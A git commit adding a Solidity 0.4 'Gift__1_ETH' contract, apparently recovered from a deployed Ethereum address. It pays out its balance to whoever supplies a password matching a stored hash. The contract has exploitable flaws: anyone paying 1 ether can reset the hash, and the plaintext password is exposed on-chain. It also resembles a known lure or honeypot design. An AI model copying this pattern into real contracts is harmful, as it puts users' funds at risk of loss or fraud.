f972b7307295a31561984b38eb1b531ecc4a733d
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 14:01:21 +0700

    add contract Gift__1_ETH

---
+++ Gift__1_ETH.sol
@@ -0,0 +1,44 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Gift__1_ETH at 0x4d200a0A7066Af311baBA7A647B1CCe54AE2f9A5
+*/
+pragma solidity ^0.4.18;
+
+contract Gift__1_ETH
+{
+    bool passHasBeenSet = false;
+    
+    function()payable{}
+    
+    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
+    
+    bytes32 public hashPass;
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if(!passHasBeenSet&&(msg.value >= 1 ether))
+        {
+            hashPass = hash;
+        }
+    }
+    
+    function GetGift(bytes pass)
+    public
+    payable
+    {
+        if(hashPass == sha3(pass))
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(hash==hashPass)
+        {
+           passHasBeenSet=true;
+        }
+    }
+}
